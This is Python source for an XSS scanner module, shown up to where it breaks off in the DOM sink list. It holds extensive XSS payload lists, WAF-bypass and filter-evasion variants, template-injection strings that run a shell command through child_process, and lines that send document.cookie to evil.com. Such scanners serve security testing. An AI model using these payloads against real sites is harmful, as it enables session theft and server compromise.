"""
XSS Scanner GOD-MODE v3.0 - Zero False Positives Edition

Enterprise-grade Cross-Site Scripting scanner with:
- WAF Detection & Bypass (12+ WAFs)
- Context-Aware Payloads (HTML, Attribute, JS, URL, CSS, SVG)
- Polyglot Payloads (multi-context)
- DOM XSS Detection (sources/sinks analysis)
- Blind XSS Support (callback verification)
- Mutation Engine (encoding variations)
- Cross-Validation (multiple confirmation)
- Confidence Scoring (0-100)
- Anti-False-Positive Heuristics
- CSP Analysis & Bypass
- Browser-specific Payloads
"""

from __future__ import annotations

import asyncio
import hashlib
import html
import random
import re
import string
import time
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import TYPE_CHECKING, Any
from urllib.parse import parse_qs, quote, urlencode, urlparse, unquote

import httpx

from scanning.findings import Finding, VulnType, VulnCategory, Severity
from scanning.vuln_scanner import ScanModule
from scanning.scan_context import ScanContext
from utils.exploitation_helper import ExploitationHelper
from utils.logger import get_logger
from utils.scanner_helpers import WAFType as BaseWAFType, WAFDetector as BaseWAFDetector
from utils.scan_client import get_scan_client
from utils.payload_library import PayloadLibrary, PayloadCategory
from utils.response_analyzer import (
    PayloadEchoDetector,
    ConfidenceEngine,
    EchoType,
    EchoAnalysis,
    ConfidenceLevel,
    ConfidenceScore,
)

# Form Context Preserver for maintaining valid values during injection testing (2026-02-20)
# Solves: Testing XSS in username field but password empty → server rejects
from scanning.form_context_preserver import (
    FormContextPreserver,
    FormDefinition,
    FieldDefinition,
    FieldType,
)

if TYPE_CHECKING:
    from core.config_manager import Settings
    from utils.rate_limiter import RateLimiter

logger = get_logger(__name__)

# WAF Bypass Engine integration (2026-02-20)
# Uses sophisticated behavioural bypass strategies from phantom/waf_bypass_engine.py
_WAF_BYPASS_ENGINE_AVAILABLE = True
try:
    from phantom.waf_bypass_engine import (
        WAFBypassEngine, WAFDetectionResult, BehaviourFamily,
        BypassTechnique, get_waf_bypass_engine_sync,
    )
except ImportError:
    _WAF_BYPASS_ENGINE_AVAILABLE = False
    WAFBypassEngine = None
    WAFDetectionResult = None

# Second-Order Tracker for cross-endpoint vulnerability detection (2026-02-20)
# Tracks inputs to detect payloads that execute in different locations
_SECOND_ORDER_AVAILABLE = True
try:
    from scanning.second_order_tracker import (
        SecondOrderTracker,
        VulnType as SecondOrderVulnType,
    )
except ImportError:
    _SECOND_ORDER_AVAILABLE = False
    SecondOrderTracker = None  # type: ignore
    SecondOrderVulnType = None  # type: ignore


# =============================================================================
# VERSION & CONSTANTS
# =============================================================================

XSS_SCANNER_VERSION = "3.0.0-GOD-MODE"

# Minimum confidence to report (anti-false-positive)
MIN_CONFIDENCE_THRESHOLD = 75
# Cross-validation: requires N confirmations
# FIX 2026-02-16: Reduced from 2 to 1 - single confirmed reflection is sufficient
# The old value caused false negatives when only 1 mutation worked
CROSS_VALIDATION_REQUIRED = 1


class XSSContext(Enum):
    """XSS injection contexts - Theme 11: Updated for modern frameworks."""
    HTML_TEXT = auto()           # Between tags: <div>HERE</div>
    HTML_ATTRIBUTE = auto()      # Inside attribute: <input value="HERE">
    HTML_ATTRIBUTE_UNQUOTED = auto()  # <input value=HERE>
    HTML_ATTRIBUTE_SINGLE = auto()    # <input value='HERE'>
    JS_STRING = auto()           # var x = "HERE";
    JS_STRING_SINGLE = auto()    # var x = 'HERE';
    JS_TEMPLATE = auto()         # var x = `HERE`;
    JS_BLOCK = auto()            # <script>HERE</script>
    URL_PARAM = auto()           # href="HERE" or src="HERE"
    CSS_VALUE = auto()           # style="color: HERE"
    SVG_CONTEXT = auto()         # Inside SVG element
    COMMENT = auto()             # <!-- HERE -->
    # Theme 11: Modern reactive frameworks (2025-2026)
    ALPINE_DIRECTIVE = auto()    # x-data="HERE" or x-on:click="HERE"
    HTMX_ATTRIBUTE = auto()      # hx-get="HERE" or hx-post="HERE"
    VUE_DIRECTIVE = auto()       # v-bind:attr="HERE" or :attr="HERE"
    SVELTE_BINDING = auto()      # bind:value="HERE" or on:click="HERE"
    ANGULAR_BINDING = auto()     # [attr]="HERE" or (event)="HERE"
    UNKNOWN = auto()


# WAFType - using centralized version from scanner_helpers
# Compatibility mapping for local enum values
class WAFType(Enum):
    """Known WAF types - wraps centralized WAFType."""
    CLOUDFLARE = "cloudflare"
    AKAMAI = "akamai"
    AWS_WAF = "aws_waf"
    IMPERVA = "imperva"
    SUCURI = "sucuri"
    MODSECURITY = "modsecurity"
    F5_BIG_IP = "f5_bigip"
    FORTINET = "fortinet"
    BARRACUDA = "barracuda"
    AZURE_WAF = "azure_waf"
    GOOGLE_CLOUD_ARMOR = "gcp_armor"
    WORDFENCE = "wordfence"
    UNKNOWN = "unknown"
    NONE = "none"

    @classmethod
    def from_base(cls, base_waf: BaseWAFType) -> "WAFType":
        """Convert from centralized WAFType to local WAFType."""
        mapping = {
            BaseWAFType.CLOUDFLARE: cls.CLOUDFLARE,
            BaseWAFType.AKAMAI: cls.AKAMAI,
            BaseWAFType.AWS_WAF: cls.AWS_WAF,
            BaseWAFType.IMPERVA: cls.IMPERVA,
            BaseWAFType.SUCURI: cls.SUCURI,
            BaseWAFType.MODSECURITY: cls.MODSECURITY,
            BaseWAFType.F5_BIG_IP: cls.F5_BIG_IP,
            BaseWAFType.FORTINET: cls.FORTINET,
            BaseWAFType.BARRACUDA: cls.BARRACUDA,
            BaseWAFType.AZURE_WAF: cls.AZURE_WAF,
            BaseWAFType.GOOGLE_CLOUD_ARMOR: cls.GOOGLE_CLOUD_ARMOR,
            BaseWAFType.WORDFENCE: cls.WORDFENCE,
            BaseWAFType.UNKNOWN: cls.UNKNOWN,
            BaseWAFType.NONE: cls.NONE,
        }
        return mapping.get(base_waf, cls.UNKNOWN)


@dataclass
class XSSEvidence:
    """Evidence of XSS vulnerability."""
    payload: str
    context: XSSContext
    reflected_in: str
    encoding_used: str
    waf_bypassed: bool
    response_snippet: str
    confirmation_count: int = 0
    
    def to_dict(self) -> dict:
        return {
            "payload": self.payload,
            "context": self.context.name,
            "reflected_in": self.reflected_in,
            "encoding_used": self.encoding_used,
            "waf_bypassed": self.waf_bypassed,
            "response_snippet": self.response_snippet[:500],
            "confirmation_count": self.confirmation_count,
        }


@dataclass
class XSSResult:
    """Result of XSS test."""
    vulnerable: bool
    context: XSSContext
    confidence: float
    payload: str
    evidence: list[XSSEvidence] = field(default_factory=list)
    waf_detected: WAFType = WAFType.NONE
    csp_present: bool = False
    csp_bypassed: bool = False


@dataclass
class TrackedInput:
    """
    Tracks inputs submitted during scan for second-order XSS detection.

    Second-order XSS occurs when:
    1. Attacker submits payload at endpoint A (e.g., /profile/update)
    2. Payload is stored in database
    3. Payload renders at DIFFERENT endpoint B (e.g., /admin/users, /reports)

    This tracking enables detection of XSS that crosses page boundaries.
    """
    submit_endpoint: str           # Where payload was submitted
    submit_method: str             # POST, PUT, PATCH
    field_name: str                # Field that received payload
    payload: str                   # The XSS payload
    payload_marker: str            # Unique marker for identification (e.g., SECONDORDER_abc123)
    timestamp: float               # When submitted
    response_status: int           # Response status from submission
    response_contains_marker: bool # If marker appeared in submit response (reflected)

    def to_dict(self) -> dict:
        return {
            "submit_endpoint": self.submit_endpoint,
            "submit_method": self.submit_method,
            "field_name": self.field_name,
            "payload": self.payload,
            "payload_marker": self.payload_marker,
            "timestamp": self.timestamp,
            "response_status": self.response_status,
        }


# =============================================================================
# WAF DETECTOR - Uses centralized scanner_helpers.WAFDetector
# =============================================================================

class WAFDetector:
    """
    Detect and identify WAF presence.

    Wrapper around centralized BaseWAFDetector for backward compatibility.
    Uses comprehensive signatures from utils/scanner_helpers.py.
    """

    def detect(self, response: httpx.Response) -> WAFType:
        """Detect WAF from response using centralized detector."""
        base_waf_type, _ = BaseWAFDetector.detect(response)
        return WAFType.from_base(base_waf_type)

    def is_blocked(self, response: httpx.Response) -> bool:
        """Check if request was blocked by WAF."""
        _, is_blocked = BaseWAFDetector.detect(response)
        return is_blocked


# =============================================================================
# CSP ANALYZER
# =============================================================================

class CSPAnalyzer:
    """Analyze Content-Security-Policy for XSS protection."""
    
    UNSAFE_DIRECTIVES = [
        "'unsafe-inline'",
        "'unsafe-eval'",
        "data:",
        "blob:",
    ]
    
    def analyze(self, response: httpx.Response) -> dict:
        """Analyze CSP header."""
        csp = response.headers.get("content-security-policy", "")
        csp_ro = response.headers.get("content-security-policy-report-only", "")
        
        result = {
            "present": bool(csp),
            "report_only": bool(csp_ro) and not csp,
            "policy": csp or csp_ro,
            "script_src": "",
            "unsafe_inline": False,
            "unsafe_eval": False,
            "allows_data": False,
            "nonce_required": False,
            "strict_dynamic": False,
            "bypasses": [],
        }
        
        if not (csp or csp_ro):
            result["bypasses"].append("No CSP header present")
            return result
        
        policy = csp or csp_ro
        
        # Parse directives
        directives = {}
        for directive in policy.split(";"):
            directive = directive.strip()
            if " " in directive:
                name, value = directive.split(" ", 1)
                directives[name] = value
            elif directive:
                directives[directive] = ""
        
        # Analyze script-src
        script_src = directives.get("script-src", directives.get("default-src", ""))
        result["script_src"] = script_src
        
        if "'unsafe-inline'" in script_src:
            result["unsafe_inline"] = True
            result["bypasses"].append("unsafe-inline allows inline scripts")
        
        if "'unsafe-eval'" in script_src:
            result["unsafe_eval"] = True
            result["bypasses"].append("unsafe-eval allows eval()")
        
        if "data:" in script_src:
            result["allows_data"] = True
            result["bypasses"].append("data: URI allows script injection")
        
        if "'nonce-" in script_src:
            result["nonce_required"] = True
        
        if "'strict-dynamic'" in script_src:
            result["strict_dynamic"] = True
        
        # Check for missing script-src
        if "script-src" not in directives and "default-src" not in directives:
            result["bypasses"].append("No script-src directive")
        
        # Check for wildcard
        if "*" in script_src:
            result["bypasses"].append("Wildcard in script-src")
        
        # Check for specific bypasses
        bypass_domains = [
            "*.google.com", "*.googleapis.com",  # JSONP
            "*.cloudflare.com",
            "cdnjs.cloudflare.com",  # Known gadgets
            "ajax.googleapis.com",
            "*.jquery.com",
        ]
        for domain in bypass_domains:
            if domain.replace("*", "") in script_src:
                result["bypasses"].append(f"CSP allows {domain} - potential JSONP bypass")
        
        return result


# =============================================================================
# PAYLOAD MUTATION ENGINE
# =============================================================================

class PayloadMutator:
    """Mutate payloads to bypass filters.

    2026-02-20: Enhanced with WAFBypassEngine integration.
    When a WAFDetectionResult is provided, uses sophisticated behavioural bypass
    strategies from phantom/waf_bypass_engine.py for better evasion.
    """

    @staticmethod
    def mutate(
        payload: str,
        mutation_level: int = 3,
        waf_detection: "WAFDetectionResult | None" = None,
    ) -> list[str]:
        """Generate payload mutations.

        Args:
            payload: Original XSS payload
            mutation_level: Mutation complexity (1-3)
            waf_detection: Full WAFDetectionResult from WAFBypassEngine (optional)

        Returns:
            List of mutated payloads for WAF bypass
        """
        mutations = [payload]  # Original

        # 2026-02-20: Use WAFBypassEngine if available and waf_detection provided
        if _WAF_BYPASS_ENGINE_AVAILABLE and waf_detection is not None and waf_detection.detected:
            try:
                bypass_mutations = PayloadMutator._apply_waf_bypass_engine(payload, waf_detection)
                if bypass_mutations:
                    mutations.extend(bypass_mutations)
                    logger.debug(
                        f"[XSS] WAFBypassEngine generated {len(bypass_mutations)} bypass variants "
                        f"for {waf_detection.waf_name} ({waf_detection.behaviour_family.value})"
                    )
                    # Continue with basic mutations for additional coverage
            except Exception as e:
                logger.debug(f"[XSS] WAFBypassEngine mutation failed: {e}")

        if mutation_level >= 1:
            # Case variations
            mutations.append(payload.upper())
            mutations.append(payload.lower())
            mutations.append(PayloadMutator._random_case(payload))

            # URL encoding
            mutations.append(quote(payload))
            mutations.append(quote(payload, safe=''))

        if mutation_level >= 2:
            # Double encoding
            mutations.append(quote(quote(payload)))

            # HTML entities
            mutations.append(PayloadMutator._html_encode(payload))
            mutations.append(PayloadMutator._html_encode_decimal(payload))
            mutations.append(PayloadMutator._html_encode_hex(payload))

            # Unicode
            mutations.append(PayloadMutator._unicode_encode(payload))
            
        if mutation_level >= 3:
            # Whitespace variations
            mutations.append(payload.replace(" ", "\t"))
            mutations.append(payload.replace(" ", "\n"))
            mutations.append(payload.replace(" ", "\x0c"))
            mutations.append(payload.replace(" ", "/"))
            
            # Comment insertion
            mutations.append(PayloadMutator._insert_comments(payload))
            
            # Null bytes
            mutations.append(payload.replace("<", "<\x00"))
            mutations.append(payload.replace(">", ">\x00"))
            
            # Tag breaking
            mutations.append(payload.replace("<script", "<scr\x00ipt"))
            mutations.append(payload.replace("<script", "<scr\tipt"))
            
        return list(set(mutations))
    
    @staticmethod
    def _random_case(s: str) -> str:
        return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in s)
    
    @staticmethod
    def _html_encode(s: str) -> str:
        return ''.join(f"&#{ord(c)};" for c in s)
    
    @staticmethod
    def _html_encode_decimal(s: str) -> str:
        return ''.join(f"&#{ord(c)};" if c in '<>"\'/()=' else c for c in s)
    
    @staticmethod
    def _html_encode_hex(s: str) -> str:
        return ''.join(f"&#x{ord(c):x};" for c in s)
    
    @staticmethod
    def _unicode_encode(s: str) -> str:
        result = ""
        for c in s:
            if c in '<>"\'/()=':
                result += f"\\u{ord(c):04x}"
            else:
                result += c
        return result
    
    @staticmethod
    def _insert_comments(payload: str) -> str:
        """Insert HTML comments to break filters."""
        result = payload
        for tag in ["script", "img", "svg", "body", "iframe"]:
            result = result.replace(f"<{tag}", f"<{tag}<!---->")
        return result

    @staticmethod
    def _apply_waf_bypass_engine(
        payload: str,
        waf_detection: "WAFDetectionResult",
    ) -> list[str]:
        """Apply WAFBypassEngine bypass strategies to XSS payload.

        2026-02-20: Uses behavioural classification for intelligent bypass selection:
        - REGEX_NAIVE: Simple encoding bypasses
        - REGEX_ADVANCED: Obfuscation + fragmentation
        - MACHINE_LEARNING: Semantic-valid payloads
        - SIGNATURE_BASED: Mutation techniques
        - HYBRID: Combined approach
        """
        if not _WAF_BYPASS_ENGINE_AVAILABLE:
            return []

        try:
            engine = get_waf_bypass_engine_sync()

            # Generate bypass variants using the engine
            # Context "xss" enables XSS-specific transformations
            variants = engine.generate_bypass_variants(
                payload=payload,
                detection=waf_detection,
                context="xss",
                max_variants=8,
            )

            # Extract just the payloads (not the technique info)
            bypassed_payloads = [v[0] for v in variants if v[0] != payload]

            return bypassed_payloads

        except Exception as e:
            logger.debug(f"[XSS] WAFBypassEngine error: {e}")
            return []


# =============================================================================
# XSS SCANNER GOD-MODE v3.0
# =============================================================================

class XSSScanner(ScanModule):
    """
    XSS Scanner GOD-MODE v3.0 - Zero False Positives Edition
    
    Features:
    - WAF Detection & Bypass (12+ WAFs)
    - Context-Aware Payloads (7+ contexts)
    - Polyglot Payloads
    - DOM XSS Detection
    - Blind XSS Support
    - Mutation Engine
    - Cross-Validation
    - Confidence Scoring (0-100)
    - CSP Analysis & Bypass
    - Anti-False-Positive Heuristics
    """
    
    name = "xss_scanner"
    version = XSS_SCANNER_VERSION
    
    # ==========================================================================
    # POLYGLOT PAYLOADS - Work in multiple contexts
    # ==========================================================================
    
    POLYGLOT_PAYLOADS = [
        # Ultimate polyglot - works in HTML, JS string, URL
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
        
        # Multi-context polyglot
        "'\"><img src=x onerror=alert(1)//",
        
        # JS + HTML context
        "</script><script>alert(1)</script>",
        
        # Attribute + HTML
        "'\"--><script>alert(1)</script>",
        
        # URL + HTML
        "javascript:alert(1)//\"><img src=x onerror=alert(1)>",
        
        # Template literal escape
        "${alert(1)}",
        
        # SVG polyglot
        "<svg/onload=alert(1)>",
        
        # Combined attribute escape
        "' onmouseover='alert(1)' x='",
        
        # Double encoding escape
        "%253Cscript%253Ealert(1)%253C/script%253E",
    ]

    # ==========================================================================
    # PHP LEGACY BYPASS PAYLOADS (DVWA, bWAPP, Mutillidae, WebGoat)
    # Case variations, null bytes, encoding bypasses for PHP filter evasion
    # ==========================================================================

    PHP_LEGACY_BYPASS_PAYLOADS = [
        # Case variation bypasses (preg_match without /i flag)
        "<ScRiPt>alert(1)</ScRiPt>",
        "<SCRIPT>alert(1)</SCRIPT>",
        "<scRIPT>alert(1)</scRIPT>",
        "<Script>alert(1)</Script>",
        "<IMG SRC=x ONERROR=alert(1)>",
        "<iMg SrC=x OnErRoR=alert(1)>",
        "<Img Src=x Onerror=alert(1)>",
        "<SVG ONLOAD=alert(1)>",
        "<SvG oNlOaD=alert(1)>",

        # Null byte injection (older PHP < 5.3.4)
        "<scr\x00ipt>alert(1)</script>",
        "<script\x00>alert(1)</script>",
        "<img src=x onerror=alert(1)\x00>",

        # HTML entity encoding bypasses
        "&#60;script&#62;alert(1)&#60;/script&#62;",
        "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
        "&lt;script&gt;alert(1)&lt;/script&gt;",

        # Double URL encoding (PHP urldecode chains)
        "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
        "%25%33%43script%25%33%45alert(1)%25%33%43/script%25%33%45",

        # Keyword filter bypass - character insertion
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<scrscriptipt>alert(1)</scrscriptipt>",
        "<scr\nipt>alert(1)</scr\nipt>",
        "<scr\tipt>alert(1)</scr\tipt>",
        "<scr\ript>alert(1)</scr\ript>",

        # Alternative event handlers (when onerror is filtered)
        "<body onpageshow=alert(1)>",
        "<body onhashchange=alert(1)>",
        "<input onblur=alert(1) autofocus><input autofocus>",
        "<video><source onerror=alert(1)>",
        "<audio onerror=alert(1) src=x>",
        "<details open ontoggle=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<meter onmouseover=alert(1)>0</meter>",

        # Tag variations (when <script> is blocked)
        "<svg><script>alert(1)</script></svg>",
        "<math><mtext><script>alert(1)</script></mtext></math>",

        # Attribute injection without quotes (PHP addslashes bypass)
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",

        # PHP htmlspecialchars bypass (ENT_NOQUOTES)
        "<img src=x onerror=alert(1)>",  # Works if ENT_NOQUOTES

        # Expression for older IE (often found in legacy PHP apps)
        "<div style=width:expression(alert(1))>",
        "<img style=xss:expr/*XSS*/ession(alert(1))>",

        # Data URI bypasses
        "<a href=data:text/html,<script>alert(1)</script>>click</a>",
        "<iframe src=data:text/html,<script>alert(1)</script>>",

        # JavaScript protocol variations
        "<a href=javascript:alert(1)>click</a>",
        "<a href=javascript&#58;alert(1)>click</a>",
        "<a href=javascript&#x3A;alert(1)>click</a>",
        "<a href=&#106;avascript:alert(1)>click</a>",
        "<a href=&#x6A;avascript:alert(1)>click</a>",

        # Alert alternatives (when alert is filtered)
        "<script>confirm(1)</script>",
        "<script>prompt(1)</script>",
        "<script>eval('ale'+'rt(1)')</script>",
        "<script>window['alert'](1)</script>",
        "<script>this['alert'](1)</script>",
        "<script>self['alert'](1)</script>",
        "<script>top['alert'](1)</script>",
        "<script>[].constructor.constructor('alert(1)')()</script>",

        # Backtick execution (template literals)
        "<script>alert`1`</script>",
        "<img src=x onerror=alert`1`>",
        "<svg onload=alert`1`>",
    ]

    # ==========================================================================
    # CONTEXT-SPECIFIC PAYLOADS
    # ==========================================================================
    
    PAYLOADS_BY_CONTEXT = {
        XSSContext.HTML_TEXT: [
            "<script>alert(XSS)</script>",
            "<img src=x onerror=alert(XSS)>",
            "<svg onload=alert(XSS)>",
            "<body onload=alert(XSS)>",
            "<iframe src='javascript:alert(XSS)'>",
            "<math><mtext><table><mglyph><style><img src=x onerror=alert(XSS)>",
            "<details open ontoggle=alert(XSS)>",
            "<marquee onstart=alert(XSS)>",
            "<video><source onerror=alert(XSS)>",
            "<audio src=x onerror=alert(XSS)>",
            "<input onfocus=alert(XSS) autofocus>",
            "<select autofocus onfocus=alert(XSS)>",
            "<textarea autofocus onfocus=alert(XSS)>",
            "<keygen autofocus onfocus=alert(XSS)>",
            "<object data='javascript:alert(XSS)'>",
            "<embed src='javascript:alert(XSS)'>",
            "<a href='javascript:alert(XSS)'>click</a>",
            "<form action='javascript:alert(XSS)'><input type=submit>",
            "<isindex action='javascript:alert(XSS)'>",
            "<xss onmouseover=alert(XSS)>hover</xss>",
        ],
        
        XSSContext.HTML_ATTRIBUTE: [
            '" onmouseover="alert(XSS)" x="',
            '" onfocus="alert(XSS)" autofocus x="',
            '" onclick="alert(XSS)" x="',
            '" onload="alert(XSS)" x="',
            '"><script>alert(XSS)</script>',
            '"><img src=x onerror=alert(XSS)>',
            '" style="background:url(javascript:alert(XSS))"',
            '" onmouseenter="alert(XSS)" x="',
            '"/><script>alert(XSS)</script>',
            '" accesskey="x" onclick="alert(XSS)" x="',
        ],
        
        XSSContext.HTML_ATTRIBUTE_SINGLE: [
            "' onmouseover='alert(XSS)' x='",
            "' onfocus='alert(XSS)' autofocus x='",
            "' onclick='alert(XSS)' x='",
            "'><script>alert(XSS)</script>",
            "'><img src=x onerror=alert(XSS)>",
            "' style='background:url(javascript:alert(XSS))'",
        ],
        
        XSSContext.HTML_ATTRIBUTE_UNQUOTED: [
            " onmouseover=alert(XSS) ",
            " onfocus=alert(XSS) autofocus ",
            " onclick=alert(XSS) ",
            "><script>alert(XSS)</script>",
            "><img src=x onerror=alert(XSS)>",
            " style=background:url(javascript:alert(XSS)) ",
        ],
        
        XSSContext.JS_STRING: [
            '";alert(XSS);//',
            '"-alert(XSS)-"',
            '";</script><script>alert(XSS)</script>',
            '"+alert(XSS)+"',
            '"*alert(XSS)*"',
            '";}</script><script>alert(XSS)</script>',
        ],
        
        XSSContext.JS_STRING_SINGLE: [
            "';alert(XSS);//",
            "'-alert(XSS)-'",
            "';</script><script>alert(XSS)</script>",
            "'+alert(XSS)+'",
        ],
        
        XSSContext.JS_TEMPLATE: [
            "${alert(XSS)}",
            "`-alert(XSS)-`",
            "${`${alert(XSS)}`}",
            "`;</script><script>alert(XSS)</script>",
        ],
        
        XSSContext.JS_BLOCK: [
            "</script><script>alert(XSS)</script>",
            "</script><img src=x onerror=alert(XSS)>",
            "alert(XSS);",
            "};alert(XSS);{",
        ],
        
        XSSContext.URL_PARAM: [
            "javascript:alert(XSS)",
            "data:text/html,<script>alert(XSS)</script>",
            "data:text/html;base64,PHNjcmlwdD5hbGVydChYU1MpPC9zY3JpcHQ+",
            "vbscript:alert(XSS)",
            "javascript:alert(XSS)//",
            "java\nscript:alert(XSS)",
            "java\tscript:alert(XSS)",
            "&#x6A;avascript:alert(XSS)",
        ],
        
        XSSContext.CSS_VALUE: [
            "expression(alert(XSS))",
            "url(javascript:alert(XSS))",
            "url('javascript:alert(XSS)')",
            "behavior:url(#default#time2)",
            "-moz-binding:url(http://evil.com/xss.xml#xss)",
        ],
        
        XSSContext.SVG_CONTEXT: [
            "<svg onload=alert(XSS)>",
            "<svg><script>alert(XSS)</script></svg>",
            "<svg><animate onbegin=alert(XSS)>",
            "<svg><set onbegin=alert(XSS)>",
            "<svg><handler xmlns:ev='http://www.w3.org/2001/xml-events' ev:event='load'>alert(XSS)</handler>",
        ],
        
        XSSContext.COMMENT: [
            "--><script>alert(XSS)</script><!--",
            "--!><script>alert(XSS)</script>",
            "<!----><script>alert(XSS)</script>",
        ],

        # Theme 11: Modern reactive framework contexts
        XSSContext.ALPINE_DIRECTIVE: [
            # Alpine.js x-data expression injection
            "'); alert('XSS'); ('",
            "'}; alert('XSS'); {'",
            "$el.innerHTML='<img src=x onerror=alert(XSS)>'",
            "$refs.foo.innerHTML='<script>alert(XSS)</script>'",
            "fetch('//evil.com?'+document.cookie)",
            # x-on:click expression injection
            "); alert('XSS'); (",
            "}; alert('XSS'); {",
            "$event.target.innerHTML='<img src=x onerror=alert(XSS)>'",
        ],

        XSSContext.HTMX_ATTRIBUTE: [
            # HTMX hx-get/hx-post URL injection
            "javascript:alert('XSS')",
            "//evil.com/steal?c='+document.cookie+'",
            "data:text/html,<script>alert('XSS')</script>",
            # hx-trigger expression injection
            "load, click[target.innerHTML='<img src=x onerror=alert(XSS)>']",
            # hx-vals JSON injection
            '{"x":"</script><script>alert(XSS)</script>"}',
        ],

        XSSContext.VUE_DIRECTIVE: [
            # v-bind expression injection
            "constructor.constructor('alert(XSS)')()",
            "'+alert('XSS')+'",
            "_vm.$el.innerHTML='<img src=x onerror=alert(XSS)>'",
            # v-on / @event injection
            "); alert('XSS'); (",
            "this.$el.innerHTML='<script>alert(XSS)</script>'",
            # v-html sink
            "<img src=x onerror=alert('XSS')>",
        ],

        XSSContext.SVELTE_BINDING: [
            # Svelte bind/on expression injection
            "'); alert('XSS'); ('",
            "}; alert('XSS'); {",
            "{@html '<img src=x onerror=alert(XSS)>'}",
            # Svelte template expression
            "${alert('XSS')}",
        ],

        XSSContext.ANGULAR_BINDING: [
            # Angular [property] binding injection
            "constructor.constructor('alert(XSS)')()",
            "{{constructor.constructor('alert(XSS)')()}}",
            # (event) binding injection
            "); alert('XSS'); (",
            # Template injection
            "{{$on.constructor('alert(XSS)')()}}",
            "<img src=x onerror=alert('XSS')>",
        ],
    }
    
    # ==========================================================================
    # WAF BYPASS PAYLOADS
    # ==========================================================================
    
    WAF_BYPASS_PAYLOADS = {
        WAFType.CLOUDFLARE: [
            "<svg/onload=alert`XSS`>",
            "<img src=x onerror=alert`XSS`>",
            "<svg onload=\u0061\u006C\u0065\u0072\u0074(1)>",
            "<%00script>alert(XSS)</script>",
        ],
        WAFType.AKAMAI: [
            "<img src=x onerror='alert(XSS)'>",
            "<svg/onload='alert(XSS)'>",
            "<<script>alert(XSS)//<</script>",
        ],
        WAFType.AWS_WAF: [
            "<img src=x onerror=alert(XSS)>",
            "<svg onload=alert(XSS)>",
            "<body onload=alert(XSS)>",
        ],
        WAFType.MODSECURITY: [
            "<scr<script>ipt>alert(XSS)</scr</script>ipt>",
            "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
            "<svg/onload=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>",
        ],
        WAFType.IMPERVA: [
            "<svg/onload=alert(String.fromCharCode(88,83,83))>",
            "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
        ],
        WAFType.WORDFENCE: [
            "<svg/onload=alert`XSS`>",
            "<img src=x onerror=alert`XSS`>",
            "%3Csvg%20onload=alert(1)%3E",
        ],
    }
    
    # ==========================================================================
    # FRAMEWORK TEMPLATE INJECTION PAYLOADS
    # ==========================================================================

    TEMPLATE_INJECTION_PAYLOADS = [
        # Angular (v1.x sandbox escape + v2+ template injection)
        ("{{constructor.constructor('alert(1)')()}}", "angular_constructor"),
        ("{{$on.constructor('alert(1)')()}}", "angular_on"),
        ("{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}", "angular_sandbox_v1"),
        ("{{toString().constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}", "angular_sandbox_v2"),
        ("{{7*7}}", "angular_expression"),  # Detection: should render as "49"
        ("{{constructor.constructor('return this')().alert(1)}}", "angular_v16"),

        # Vue.js (v2 template compilation + v3)
        ("{{_c.constructor('alert(1)')()}}", "vue_v2_compile"),
        ("{{this.constructor.constructor('alert(1)')()}}", "vue_constructor"),
        ("{{7*7}}", "vue_expression"),  # Detection: should render as "49"

        # React (dangerouslySetInnerHTML + JSX injection)
        # React doesn't interpolate templates in the same way, test for JSX/HTML injection
        ("<img src=x onerror=alert(1)>", "react_dangerouslySetInnerHTML"),

        # Handlebars / Mustache
        ("{{#with \"s\" as |string|}}\n  {{#with \"e\"}}\n    {{#with split as |conslist|}}\n      {{this.pop}}\n      {{this.push (lookup string.sub \"constructor\")}}\n      {{this.pop}}\n      {{#with string.split as |codelist|}}\n        {{this.pop}}\n        {{this.push \"return require('child_process').exec('id');\"}}\n        {{this.pop}}\n        {{#each conslist}}\n          {{#with (string.sub.apply 0 codelist)}}\n            {{this}}\n          {{/with}}\n        {{/each}}\n      {{/with}}\n    {{/with}}\n  {{/with}}\n{{/with}}", "handlebars_rce"),
        ("{{lookup (create --resolve=node_modules/.bin/ this) 'id'}}", "handlebars_lookup"),

        # EJS (Embedded JavaScript)
        ("<%= 7*7 %>", "ejs_expression"),
        ("<%= global.process.mainModule.require('child_process').execSync('id') %>", "ejs_rce"),

        # Pug/Jade
        ("#{7*7}", "pug_expression"),
    ]

    # Marker: if this string appears in response, template injection confirmed
    TEMPLATE_MATH_RESULT = "49"  # 7*7

    # ==========================================================================
    # DOM XSS SOURCES AND SINKS
    # ==========================================================================
    
    # FIX 2026-02-18: Expanded DOM sources for modern attack vectors
    DOM_SOURCES = [
        # URL/Location sources
        "document.URL", "document.documentURI", "document.URLUnencoded",
        "document.baseURI", "document.referrer",
        "location", "location.href", "location.search", "location.hash",
        "location.pathname", "location.origin", "location.host",
        "window.name", "window.location",
        # Cookie/Storage sources
        "document.cookie", "document.domain",
        "localStorage", "sessionStorage",
        "IndexedDB.open", "indexedDB.open",
        # Modern URL APIs (ES2015+)
        "URLSearchParams", "new URL(", "URL.searchParams",
        "URL.hash", "URL.pathname", "URL.search",
        # History API
        "history.pushState", "history.replaceState", "history.state",
        "popstate",
        # Network sources
        "XMLHttpRequest.open", "XMLHttpRequest.send", "XMLHttpRequest.response",
        "fetch(", "Response.json", "Response.text",
        "WebSocket(", "WebSocket.onmessage",
        "EventSource(", "EventSource.onmessage",
        # Message sources
        "postMessage(", "onmessage", "MessageChannel", "BroadcastChannel",
        # Worker sources
        "Worker(", "SharedWorker(", "ServiceWorker",
        # Form/Input sources
        "FormData", "form.elements", "input.value", "textarea.value",
        "select.value", "contenteditable",
        # Clipboard API
        "navigator.clipboard", "clipboardData",
        # File API
        "FileReader", "Blob", "File",
        # Drag and Drop
        "dataTransfer", "ondrop", "ondragover",
    ]
    
    DOM_SINKS = [
        # HTML modification
